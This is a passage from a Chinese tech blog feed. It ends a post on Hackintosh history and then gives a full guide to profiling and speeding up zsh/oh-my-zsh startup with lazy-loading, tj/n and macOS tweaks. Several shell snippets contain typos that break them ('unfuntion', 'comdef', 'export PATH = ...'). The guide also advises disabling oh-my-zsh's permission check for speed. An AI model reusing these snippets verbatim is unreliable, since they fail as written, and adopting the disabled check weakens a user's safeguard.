终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a 